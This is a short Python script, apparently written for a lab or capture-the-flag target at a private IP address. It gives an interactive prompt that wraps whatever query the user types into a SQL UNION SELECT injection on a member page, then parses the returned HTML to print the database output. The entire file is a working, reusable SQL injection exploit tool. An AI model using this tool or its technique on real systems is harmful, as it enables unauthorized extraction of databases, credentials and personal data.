from cmd import Cmd
import requests

URL = "http://192.168.1.20/index.php?page=member"

def find_needle(haystack, needle, n) :
    start = haystack.find(needle)
    while start >= 0 and n > 1 :
        start = haystack.find(needle, start + len(needle))
        n -= 1
    return start


class Term(Cmd):
    prompt = "Injection > "

    def default(self, args) :
        r = requests.get(URL + f"&id=1 UNION SELECT 2,({args})&Submit=Submit")
        injection_results = r.text[find_needle(r.text, "Surname", 2) + 10 : find_needle(r.text, "</pre>", 2)]
        splitted_results = injection_results.split(",")
        print("\n---> Injection returns :\n")
        for result in splitted_results :
            print(result)
        print("\n")

    def do_exit(self, args) :
        return True

term = Term()
term.cmdloop()
